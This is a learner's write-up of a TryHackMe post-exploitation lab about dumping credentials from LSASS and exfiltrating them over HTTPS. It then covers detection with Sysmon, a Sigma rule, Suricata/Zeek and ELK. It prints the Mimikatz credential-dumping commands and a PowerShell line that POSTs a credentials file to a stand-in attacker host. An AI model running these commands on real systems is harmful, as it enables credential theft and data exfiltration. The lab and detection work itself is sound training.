Scenario 5: Credential Dumping and Exfiltration – Mimikatz used to dump LSASS, exfiltration over HTTPS
Room Used: TryHackMe – Post‑Exploitation Basics
Link: https://tryhackme.com/room/postexploit 

🎯 Objective
Understand how attackers extract credentials from LSASS memory using Mimikatz and then exfiltrate them stealthily using HTTPS.

🛠 What I Did:
Completed the Post‑Exploitation Basics room covering Mimikatz, BloodHound, PowerView, and more 

Ran Mimikatz:

privilege::debug  
sekurlsa::logonpasswords
to dump NTLM hashes and plaintext credentials from LSASS.

Extracted credentials such as domain user/password pairs.

Simulated data exfiltration:
Invoke-WebRequest -Uri https://attacker.example.com/exfil -Method POST -Body (Get-Content creds.txt)
mimicking secure exfiltration over HTTPS.

🔍 Detection Strategy:
Used Sysmon Event ID 10 to detect suspicious access to lsass.exe.

Alerts flagged when processes like mimikatz.exe, procdump.exe, or PowerShell targeted LSASS.

Example Sigma rule:

detection:
  selection:
    EventID: 10
    TargetImage: '*\\lsass.exe'
    SourceImage|contains: ['mimikatz.exe','procdump.exe']
  condition: selection
Leveraged Suricata/Zeek to monitor encrypted outbound HTTPS sessions.

Winlogbeat forwarded log events to ELK, and I built Kibana dashboards to visualize suspicious LSASS access and exfil behavior.

🧰 Tools Used:
Mimikatz

Sysmon + Winlogbeat

Sigma + ELK Stack

Suricata/Zeek

PowerShell

Event Viewer

✅ Conclusion:
This room taught me how attackers dump credentials from memory and hide exfil inside HTTPS traffic. Detection hinges on monitoring process access to LSASS, unusual process behaviors, and unexpected outbound traffic. This scenario further honed my threat-hunting skills at the intersection of endpoint and network telemetry.
